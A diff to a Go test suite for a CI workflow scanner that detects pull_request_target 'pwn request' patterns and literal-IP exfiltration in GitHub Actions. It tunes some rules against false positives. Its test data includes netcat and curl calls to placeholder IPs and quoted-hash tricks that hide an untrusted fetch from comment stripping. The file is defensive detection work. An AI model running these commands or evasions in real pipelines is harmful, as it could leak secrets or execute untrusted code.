@@ -414,12 +414,14 @@ func TestRulesRunThroughTheEngine(t *testing.T) {
 		{"ppe-008/dispatch-clean.yml", nil},
 		// The fixture's title echo is a real rule 2 finding, so it is in the
 		// expected sequence rather than papered over by removing the line.
-		{"ppe-009/pwn_request.yml", []string{Rule9ID, Rule2ID, Rule9ID, Rule9ID, Rule9ID, Rule9ID}},
-		{"ppe-009/workflow_run.yml", []string{Rule9ID}},
+		{"ppe-009/pwn_request.yml", []string{Rule9ID, Rule2ID, Rule9ID, Rule9ID, Rule9ID}},
+		{"ppe-009/workflow_run.yml", nil},
 		{"ppe-009/negatives.yml", nil},
 		{"ppe-002/injected.yml", []string{Rule2ID, Rule2ID, Rule2ID, Rule2ID, Rule2ID, Rule2ID, Rule2ID}},
 		{"ppe-002/safe.yml", nil},
 		{"ppe-006/split_job.yml", nil},
+		{"ppe-003/legitimate.yml", []string{Rule4ID, Rule4ID, Rule4ID}},
+		{"ppe-009/base_fetch.yml", nil},
 		{
 			"ppe-003/malicious.yml",
 			[]string{
@@ -1490,18 +1492,19 @@ func TestRule9PwnRequest(t *testing.T) {
 		{Rule9ID, findings.SeverityBlock, lineOf(t, data, "refs/pull/")},
 		{Rule9ID, findings.SeverityBlock, lineOf(t, data, "repository: ${{ github.event")},
 		{Rule9ID, findings.SeverityBlock, lineOf(t, data, "git fetch origin pull")},
-		{Rule9ID, findings.SeverityBlock, lineOf(t, data, "gh run download")},
 	})
 }
 
-// workflow_run is the other privileged trigger, and the untrusted code arrives
-// as artifacts rather than as a checkout.
+// workflow_run plus an artifact download is GitHub Security Lab's recommended
+// safe replacement for pull_request_target, so it is not a finding. Blocking the
+// pattern the documentation tells you to adopt instead is how a blocking rule
+// gets switched off.
 func TestRule9OnWorkflowRun(t *testing.T) {
-	file, data := parseFixture(t, "ppe-009/workflow_run.yml")
+	file, _ := parseFixture(t, "ppe-009/workflow_run.yml")
 
-	assertFindings(t, Rule9(file), []want{
-		{Rule9ID, findings.SeverityBlock, lineOf(t, data, "gh run download")},
-	})
+	if got := Rule9(file); len(got) != 0 {
+		t.Errorf("got %d findings, want 0 on the recommended artifact hand-off: %+v", len(got), got)
+	}
 }
 
 // The negatives, which matter more here than the positives. A plain
@@ -1526,9 +1529,11 @@ func TestRule9FindsEachShapeSeparately(t *testing.T) {
 		{"head sha", "      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n"},
 		{"pull ref", "      - uses: actions/checkout@v4\n        with:\n          ref: refs/pull/${{ github.event.number }}/merge\n"},
 		{"fork repository", "      - uses: actions/checkout@v4\n        with:\n          repository: ${{ github.event.pull_request.head.repo.full_name }}\n"},
-		{"git fetch", "      - run: git fetch origin pull/1/head:pr-1\n"},
+		{"git fetch of a PR ref, then used as code", "      - run: |\n" +
+			"          git fetch origin pull/1/head:pr-1\n" +
+			"          git checkout pr-1\n" +
+			"          ./run-tests.sh\n"},
 		{"gh pr checkout", "      - run: gh pr checkout 2\n"},
-		{"gh run download", "      - run: gh run download 42\n"},
 	}
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
@@ -1567,7 +1572,10 @@ func TestRule9MatchesEveryHeadRepoSpelling(t *testing.T) {
 func TestRule9RequiresAPrivilegedTrigger(t *testing.T) {
 	step := "      - uses: actions/checkout@v4\n        with:\n" +
 		"          ref: ${{ github.event.pull_request.head.sha }}\n" +
-		"      - run: git fetch origin pull/1/head:pr-1\n"
+		"      - run: |\n" +
+		"          git fetch origin pull/1/head:pr-1\n" +
+		"          git checkout pr-1\n" +
+		"          ./run-tests.sh\n"
 
 	unprivileged := []struct{ on, reason string }{
 		{"on:\n  pull_request:\n", "a plain pull_request has a read-only token and no secrets"},
@@ -1609,6 +1617,7 @@ func TestRule9IgnoresLookalikeCommands(t *testing.T) {
 		"gh pr list\n",
 		"gh run list\n",
 		"gh run view 42\n",
+		"gh run download 42\n",
 		"git checkout pr-1\n",
 		"make fetch\n",
 	} {
@@ -1699,6 +1708,12 @@ func TestStripShellComment(t *testing.T) {
 		{"echo '# not a comment either'", "echo '# not a comment either'", "single quotes"},
 		{"TOKEN='#abc'", "TOKEN='#abc'", "an assignment"},
 		{"git fetch origin main", "git fetch origin main", "no hash at all"},
+		// These three are the evasion. A scan that only looked for a # after
+		// whitespace truncated each of them at the quoted hash and the real
+		// command after it went unseen.
+		{"echo 'release #42' && git fetch origin pull/1/head", "echo 'release #42' && git fetch origin pull/1/head", "quoted hash, real command after"},
+		{"echo \"see issue #42\" && git fetch origin pull/1/head", "echo \"see issue #42\" && git fetch origin pull/1/head", "double quoted hash, real command after"},
+		{"bash -c 'echo hi # there' && git fetch origin x", "bash -c 'echo hi # there' && git fetch origin x", "quoting across a subshell"},
 	}
 	for _, tt := range kept {
 		if got := stripShellComment(tt.in); got != tt.want {
@@ -1736,3 +1751,427 @@ func TestCommentStrippingDoesNotChangeURLHandling(t *testing.T) {
 }
 
 // indent shifts a multi line script under a run: block scalar.
+
+// The evasion the quote aware scan exists to close. Each of these hides a real
+// untrusted fetch behind a # inside a quoted string, and each one blocked on an
+// earlier version that was not quote aware.
+func TestRule9CannotBeHiddenByAQuotedHash(t *testing.T) {
+	// gh pr checkout rather than git fetch, because a bare git fetch is no
+	// longer this rule on its own. These cases are about the comment scanner,
+	// so they use a shape that is unambiguous.
+	attacks := []struct{ script, reason string }{
+		{"echo 'release #42' && gh pr checkout 12", "single quoted hash"},
+		{"echo \"see issue #42\" && gh pr checkout 12", "double quoted hash"},
+		{"bash -c 'echo hi # there' && gh pr checkout 12", "quoted hash inside a subshell"},
+		{"printf '%s\\n' '# not a comment' && gh pr checkout 12", "quoted hash then a real command"},
+		{"echo '#' && gh pr checkout 12", "a lone quoted hash"},
+		{"echo \"#\" && gh pr checkout 12", "a lone double quoted hash"},
+		{"echo 'a # b' && gh pr checkout 12 && ./run-tests.sh", "quoted hash, attack, and a run"},
+		// The git fetch shape, in full: fetch a PR ref, check it out, run it.
+		{"echo 'fix #42' && git fetch origin pull/1/head:pr\ngit checkout pr\n./run-tests.sh", "quoted hash before a full fetch attack"},
+	}
+	// Block scalars, not plain ones. In a plain scalar YAML reads the # as the
+	// start of its own comment and truncates the line before the rule ever sees
+	// it, so the plain form cannot be used to hide anything. The block form is
+	// where the hash survives to the rule, and that is the one that matters.
+	for _, tt := range attacks {
+		step := "      - run: |\n" + indent(tt.script+"\n")
+		if got := rule9OnStep(t, step); len(got) != 1 {
+			t.Errorf("%s: got %d findings, want 1: %q", tt.reason, len(got), tt.script)
+		}
+	}
+}
+
+// The other side of the same scanner: a line that only mentions the command in a
+// comment is still not a command.
+func TestRule9CommentHandlingCutsBothWays(t *testing.T) {
+	comments := []struct{ script, reason string }{
+		{"# git fetch origin pull/1/head", "whole line is a comment"},
+		{"  # git fetch origin pull/1/head", "indented comment"},
+		{"#gh pr checkout 12", "hash with no space"},
+		{"make test # then git fetch origin pull/1/head", "trailing comment"},
+	}
+	for _, tt := range comments {
+		// The indented and block forms are the ones that reach the rule, so all
+		// three go through a block scalar to keep the test honest.
+		step := "      - run: |\n" + indent(tt.script+"\n")
+		if got := rule9OnStep(t, step); len(got) != 0 {
+			t.Errorf("%s: got %d findings, want 0", tt.reason, len(got))
+		}
+	}
+}
+
+// ---------------------------------------------------- false positives found in
+// the audit
+//
+// Everything below was blocked by an earlier version of these rules and comes
+// from a real workflow. A fixture is not enough on its own for these, because
+// the point of them is the surrounding context, so the unit tests spell the
+// cases out too.
+
+// Rule 4: a four part address used as data rather than as a destination.
+//
+// Managing addresses over an HTTP API is a category of tooling where the
+// presence of a dotted quad beside a curl is the entire point: DNS providers,
+// fail2ban and CrowdSec wrappers, allowlist editors.
+func TestRule4TreatsAnIPInAPayloadAsData(t *testing.T) {
+	payloads := []struct {
+		script string
+		reason string
+	}{
+		{`curl -X POST https://api.porkbun.com/api/json/v3/dns/create/example.com -d '{"type":"A","content":"1.2.3.4"}'`, "a DNS A record"},
+		{`curl -X POST https://albis.example.com/api/ban.php -d '{"ip":"1.2.3.4","service":"ftp"}'`, "a fail2ban unban, which also matches ftp"},
+		{`curl -X POST http://localhost:8080/api/ip/unban -d '{"ip": "1.2.3.4"}'`, "an unban endpoint"},
+		{`curl -X POST https://telemetry.example.com/ingest -H "X-Version: 1.2.3.4"`, "a version in a header"},
+		{`curl -X POST https://api.example.com -d "version=1.2.3.4"`, "a version after an equals sign"},
+		{`curl -X POST https://api.example.com -d '{"whitelist":"1.2.3.4,4.3.2.1"}'`, "several addresses in one payload"},
+	}
+	for _, tt := range payloads {
+		for _, m := range literalEndpointMatches(tt.script + "\n") {
+			if m.kind == endpointIP {
+				t.Errorf("%s: blocked on an address used as data: %q", tt.reason, tt.script)
+			}
+		}
+	}
+}
+
+// The same rule from the other side: quoting a payload must not become a way to
+// hide a real endpoint, because `curl "http://1.2.3.4/x"` quotes a destination.
+func TestRule4StillBlocksAnEndpointInsideQuotes(t *testing.T) {
+	attacks := []string{
+		`curl -sS "http://1.2.3.4/x" -o /tmp/x`,
+		`nc "198.51.100.42" 4444 < /dev/null`,
+		`ssh "user@10.0.0.5"`,
+		`rsync -a file "10.0.0.5:/tmp/"`,
+	}
+	for _, script := range attacks {
+		blocked := false
+		for _, m := range literalEndpointMatches(script + "\n") {
+			if m.kind == endpointIP {
+				blocked = true
+			}
+		}
+		if !blocked {
+			t.Errorf("quoting hid a real endpoint: %q", script)
+		}
+	}
+}
+
+// Loopback cannot exfiltrate, and curl documents --resolve with 127.0.0.1 as
+// the way to test a virtual host locally. RFC1918 is deliberately NOT exempt:
+// private space is where exfiltration goes.
+func TestRule4ExemptsLoopbackButNotPrivateSpace(t *testing.T) {
+	for _, script := range []string{
+		"curl --resolve example.com:80:127.0.0.1 http://example.com/\n",
+		"curl --resolve example.com:443:127.0.0.1 https://example.com/\n",
+		"curl --resolve example.com:80:127.0.0.53 http://example.com/\n",
+		"nc 127.0.0.1 8080\n",
+	} {
+		for _, m := range literalEndpointMatches(script) {
+			if m.kind == endpointIP {
+				t.Errorf("loopback was treated as an endpoint: %q", strings.TrimSpace(script))
+			}
+		}
+	}
+
+	for _, script := range []string{
+		"nc 10.0.0.5 4444 < /dev/null\n",
+		"nc 192.168.1.10 4444 < /dev/null\n",
+		"nc 172.16.0.1 4444 < /dev/null\n",
+		"rsync -a file 10.0.0.5:/tmp/\n",
+	} {
+		blocked := false
+		for _, m := range literalEndpointMatches(script) {
+			if m.kind == endpointIP {
+				blocked = true
+			}
+		}
+		if !blocked {
+			t.Errorf("private space must still be an endpoint: %q", strings.TrimSpace(script))
+		}
+	}
+}
+
+// Rule 9: fetching the base branch under pull_request_target is the documented
+// hardening move, so it is not a finding. These are the scripts that an earlier
+// version blocked.
+func TestRule9IgnoresBaseFetches(t *testing.T) {
+	legit := []struct {
+		script string
+		reason string
+	}{
+		{"git fetch origin main --depth=1\ngit checkout origin/main -- scripts/check.js", "restore trusted tooling from base"},
+		{"git fetch origin main\nif git show origin/main:.ci/gate.sh | bash -s -- \"$PR\"; then\n  echo ok\nfi", "run the base gate"},
+		{"git fetch origin main:main-branch", "fetch base into a branch"},
+		{"git fetch origin ${{ github.event.pull_request.base.sha }} --depth=1 2>/dev/null || true", "fetch the base sha"},
+		{"git fetch --all --tags\ngit describe --tags", "an ordinary release fetch"},
+	}
+	for _, tt := range legit {
+		if got := rule9OnStep(t, "      - run: |\n"+indent(tt.script+"\n")); len(got) != 0 {
+			t.Errorf("%s: got %d findings, want 0", tt.reason, len(got))
+		}
+	}
+}
+
+// Fetching a PR ref and reading it as data is GitHub Security Lab's own
+// recommended pattern. It is the same command as the attack with two lines
+// missing, which is exactly why the rule checks for them.
+func TestRule9APrFetchThatIsOnlyReadIsNotAFinding(t *testing.T) {
+	reads := []struct {
+		script string
+		reason string
+	}{
+		{"git fetch origin pull/${{ github.event.pull_request.number }}/head:pr\nMERGE_BASE=$(git merge-base origin/${{ github.base_ref }} pr)\ngit show pr:resources/data.json > head.json", "read a file with git show"},
+		{"git fetch origin pull/1/head:pr\ngit diff pr origin/main --stat", "diff it"},
+		{"git fetch origin pull/1/head:pr\ngit log --oneline pr -5", "read its history"},
+		{"git fetch origin pull/1/head:pr", "fetch and stop"},
+	}
+	for _, tt := range reads {
+		if got := rule9OnStep(t, "      - run: |\n"+indent(tt.script+"\n")); len(got) != 0 {
+			t.Errorf("%s: got %d findings, want 0", tt.reason, len(got))
+		}
+	}
+}
+
+// The attack is the same three things together: fetch a PR ref, move onto it,
+// run something. Each has to be checked on its own, because a rule missing any
+// one of them has a cheap bypass.
+func TestRule9NeedsAllThreePartsOfTheFetchAttack(t *testing.T) {
+	attacks := []struct {
+		script string
+		reason string
+	}{
+		{"git fetch origin pull/1/head:pr\ngit checkout pr\n./run-tests.sh", "literal PR number"},
+		{"git fetch origin pull/${{ github.event.number }}/head:pr\ngit checkout pr\nmake test", "PR number as an expression"},
+		{"git fetch origin pull/${{ github.event.pull_request.number }}/head:pr-${{ github.event.number }}\ngit checkout pr-${{ github.event.number }}\nmake test", "the InstructLab shape"},
+		{"git fetch origin pull/7/head\ngit checkout FETCH_HEAD\nmake test", "FETCH_HEAD rather than a named ref"},
+		{"git fetch origin pull/7/head:pr\ngit merge FETCH_HEAD\nnpm test", "merge rather than checkout"},
+		{"git fetch origin pull/7/head:pr\ngit checkout pr\npython3 setup.py test", "a python runner"},
+		{"git fetch origin refs/pull/7/head:pr\ngit checkout pr\n./run-tests.sh", "the refs/pull spelling"},
+		{"git fetch origin pull/7/head:pr\ngit checkout pr\n./gradlew build", "a gradle wrapper"},
+	}
+	for _, tt := range attacks {
+		if got := rule9OnStep(t, "      - run: |\n"+indent(tt.script+"\n")); len(got) != 1 {
+			t.Errorf("%s: got %d findings, want 1", tt.reason, len(got))
+		}
+	}
+}
+
+// The artifact hand-off is GitHub Security Lab's recommended replacement for
+// pull_request_target, and CodeQL documents the same pair. Blocking the pattern
+// the documentation tells you to adopt is how a blocking rule gets switched off.
+func TestRule9DoesNotFlagArtifactHandoff(t *testing.T) {
+	handoffs := []struct {
+		script string
+		reason string
+	}{
+		{"gh run download \"$RUN_ID\" --dir docs-artifacts || true\n./publish.sh docs-artifacts", "CLI artifact promotion"},
+		{"gh run download ${{ github.event.workflow_run.id }} --dir status", "GitHub Security Lab's shape in the CLI"},
+		{"gh run download \"$RUN_ID\" --pattern 'flakiness-report-*' --dir .", "a named pattern"},
+		{"gh run download \"$RUN_ID\" --name main-last-build-sha --dir .", "an incremental build handoff"},
+	}
+	for _, tt := range handoffs {
+		if got := rule9OnStep(t, "      - run: |\n"+indent(tt.script+"\n")); len(got) != 0 {
+			t.Errorf("%s: got %d findings, want 0", tt.reason, len(got))
+		}
+	}
+}
+
+// The escape and error paths in the shell scanners. They are here because a
+// scanner with an untested escape branch is a scanner with an unknown one.
+func TestShellScannersHandleEscapes(t *testing.T) {
+	tests := []struct {
+		in       string
+		wantTail string
+	}{
+		// An escaped quote does not open a string, so the hash after it is real
+		// content and the rest of the line survives.
+		{`echo \"# still a string"`, `echo \"# still a string"`},
+		// A backslash outside quotes escapes the next character, which therefore
+		// cannot start a comment.
+		{`echo a\ # b`, `echo a\ `},
+		// A trailing backslash continues the line rather than ending it.
+		{`echo hi \`, `echo hi \`},
+		// Escaped quote inside single quotes is literal, POSIX style, so the
+		// string is still open.
+		{`echo 'it\'s'`, `echo 'it\'s'`},
+		// An escaped double quote does not close the string, so the rest of the
+		// line survives including a command after it.
+		{`echo "say \"hi\"" && git fetch origin pull/1/head`, `echo "say \"hi\"" && git fetch origin pull/1/head`},
+	}
+	for _, tt := range tests {
+		if got := stripShellComment(tt.in); got != tt.wantTail {
+			t.Errorf("stripShellComment(%q) = %q, want %q", tt.in, got, tt.wantTail)
+		}
+	}
+}
+
+// A quoted address at the very start of a line, and one with no quoted word at
+// all, both take the early exits in isDataFlagArgument.
+func TestIsDataFlagArgumentEdgeCases(t *testing.T) {
+	// Nothing before the quote at all.
+	if isDataFlagArgument(`"1.2.3.4"`, 0) {
+		t.Error(`a quoted address with no flag in front of it should not be data`)
+	}
+	// A data flag several words back, as in a long option list.
+	if !isDataFlagArgument(`curl --fail --silent --show-error --data {"ip":"1.2.3.4"}`, 56) {
+		t.Error("a data flag earlier on the line should count")
+	}
+	// A data flag, bare. The name=attached form that mailcow uses is `-d
+	// attr={...}`, where the two are separate words, so -d is what is matched.
+	for _, word := range []string{"-d", "--data", "-H", "-F", "-b", "-X", "-w"} {
+		if !isDataFlag(word) {
+			t.Errorf("isDataFlag(%q) = false, want true", word)
+		}
+	}
+	// A word is only a flag if the part before any = is the flag. A bare name
+	// is a name, not a flag, so that a field name can never satisfy this.
+	for _, word := range []string{"-o", "-s", "nc", "git", "--resolve", "data", "attr=", "ip=", "attr=-d"} {
+		if isDataFlag(word) {
+			t.Errorf("isDataFlag(%q) = true, want false", word)
+		}
+	}
+}
+
+// openingQuoteIndex reports the innermost quote that is still open, which is
+// what tells a nested value from the word containing it.
+func TestOpeningQuoteIndexReturnsTheInnermostOpenQuote(t *testing.T) {
+	// The value quote, which is the one that opened the region containing the
+	// address. It sits between the key and the address, which is what lets the
+	// field check see "ip": in front of it.
+	const line = `curl -d '{"ip":"1.2.3.4"}'`
+	addr := strings.Index(line, "1.2.3.4")
+	open := openingQuoteIndex(line, addr)
+	if open != strings.LastIndex(line[:addr], `"`) {
+		t.Errorf("open quote = %d, want %d: the value's own quote",
+			open, strings.LastIndex(line[:addr], `"`))
+	}
+
+	// Before the key's opening quote, the innermost open one is the outer shell
+	// quote that holds the whole object.
+	if got := openingQuoteIndex(line, strings.Index(line, `"ip"`)); got != strings.Index(line, `'`) {
+		t.Errorf("open quote before the key = %d, want the outer quote at %d", got, strings.Index(line, `'`))
+	}
+
+	// With the shell quote closed too there is nothing open. The object closes
+	// at } but the shell string continues to the closing ', so the offset that
+	// has nothing open is past that.
+	if got := openingQuoteIndex(line, strings.LastIndex(line, `'`)+1); got != -1 {
+		t.Errorf("open quote after everything closed = %d, want -1", got)
+	}
+	// And at offset zero nothing is open either.
+	if got := openingQuoteIndex(line, 0); got != -1 {
+		t.Errorf("open quote at offset 0 = %d, want -1", got)
+	}
+}
+
+// The escape branch in openingQuoteIndex: a backslash inside double quotes
+// stops the next character from closing the string.
+func TestOpeningQuoteIndexHandlesADoubleQuoteEscape(t *testing.T) {
+	const line = `echo "say \"1.2.3.4\"" && gh pr checkout 12`
+	addr := strings.Index(line, "1.2.3.4")
+
+	// The escaped quote at index 10 must not be treated as the closing quote, so
+	// the string is still open at the address and the address is inside it.
+	if got := openingQuoteIndex(line, addr); got != strings.Index(line, `"`) {
+		t.Errorf("open quote = %d, want the opening double quote at %d", got, strings.Index(line, `"`))
+	}
+
+	// And a real untrusted command on that line is still found, which is the
+	// point: the escape must not hide it.
+	step := "      - run: |\n" + indent(line+"\n")
+	if got := rule9OnStep(t, step); len(got) != 1 {
+		t.Errorf("got %d findings, want 1: an escaped quote must not hide a real command", len(got))
+	}
+}
+
+// The key= branch on its own. It is redundant for the false positive fix, since
+// every real payload case is also caught by the data flag check, but it is
+// correct on its own terms and it is what keeps `-d ip=1.2.3.4` from depending
+// on the quote handling above it.
+func TestIsIPPayloadOnAnAssignmentAlone(t *testing.T) {
+	tests := []struct {
+		line string
+		want bool
+	}{
+		{`-d ip=1.2.3.4`, true},
+		{`--data ip=1.2.3.4`, true},
+		{`-d "ip=1.2.3.4"`, true},
+		{`?ip=1.2.3.4`, true},
+		{`1.2.3.4`, false},
+		{`nc 1.2.3.4 4444`, false},
+	}
+	for _, tt := range tests {
+		off := strings.Index(tt.line, "1.2.3.4")
+		if got := isIPPayload(tt.line, off); got != tt.want {
+			t.Errorf("isIPPayload(%q) = %v, want %v", tt.line, got, tt.want)
+		}
+	}
+}
+
+// gitFetchShape tested directly rather than only through Rule9.
+//
+// Going through Rule9 is not enough to pin it down: Rule9 also checks
+// `gh pr checkout` and the checkout inputs, so a mutation that breaks
+// gitFetchShape alone can hide behind a test that happens to match one of the
+// others. Each case here is the shape on its own.
+func TestGitFetchShapeDirectly(t *testing.T) {
+	yes := []struct{ script, reason string }{
+		{"git fetch origin pull/1/head:pr\ngit checkout pr\n./run-tests.sh", "all three parts"},
+		{"git fetch origin pull/${{ github.event.number }}/head:pr\ngit checkout pr\nmake test", "PR number as an expression"},
+		{"git fetch origin refs/pull/7/head:pr\ngit switch pr\nnpm test", "the refs/pull spelling and git switch"},
+		{"git fetch origin pull/7/head\ngit checkout FETCH_HEAD\n./gradlew build", "FETCH_HEAD and a gradle wrapper"},
+		{"git fetch origin pull/7/head:pr\ngit merge FETCH_HEAD\nbun test", "git merge"},
+	}
+	for _, tt := range yes {
+		if !gitFetchShape(tt.script) {
+			t.Errorf("%s: got false, want true", tt.reason)
+		}
+	}
+
+	no := []struct{ script, reason string }{
+		{"git fetch origin main --depth=1\ngit checkout origin/main -- scripts/check.js", "a base ref, checked out and run"},
+		{"git fetch origin main\ngit show origin/main:.ci/gate.sh | bash -s", "a base ref, read and run"},
+		{"git fetch origin ${{ github.event.pull_request.base.sha }}\ngit checkout FETCH_HEAD\nmake test", "the base sha"},
+		{"git fetch origin pull/1/head:pr\nMERGE_BASE=$(git merge-base origin/main pr)\ngit show pr:f.json", "a PR ref read as data, no checkout"},
+		{"git fetch origin pull/1/head:pr\ngit diff pr origin/main", "a PR ref diffed, no checkout"},
+		{"git fetch origin pull/1/head:pr\ngit checkout pr", "checked out but never run"},
+		{"git checkout pr\nmake test", "run but never fetched"},
+		{"git fetch --all --tags\ngit describe --tags", "an ordinary release fetch"},
+	}
+	for _, tt := range no {
+		if gitFetchShape(tt.script) {
+			t.Errorf("%s: got true, want false", tt.reason)
+		}
+	}
+}
+
+// Every spelling of a pull request ref that has to be recognised. Requiring a
+// literal digit after pull/ would miss the expression form, which is how most
+// people actually write it.
+func TestPRFetchRefSpellings(t *testing.T) {
+	for _, ref := range []string{
+		"pull/1/head",
+		"pull/${{ github.event.number }}/head",
+		"pull/${{ github.event.pull_request.number }}/head",
+		"pull/${{ github.event.pull_request.number }}/merge",
+		"refs/pull/1/head",
+		"pull/1/head:pr-1",
+		"${{ github.head_ref }}",
+	} {
+		if !prFetchRef.MatchString(ref) {
+			t.Errorf("prFetchRef does not match %q", ref)
+		}
+	}
+	for _, ref := range []string{
+		"main",
+		"origin/main",
+		"${{ github.event.pull_request.base.sha }}",
+		"v1.2.3",
+		"origin/main:main-branch",
+	} {
+		if prFetchRef.MatchString(ref) {
+			t.Errorf("prFetchRef should not match the base ref %q", ref)
+		}
+	}
+}
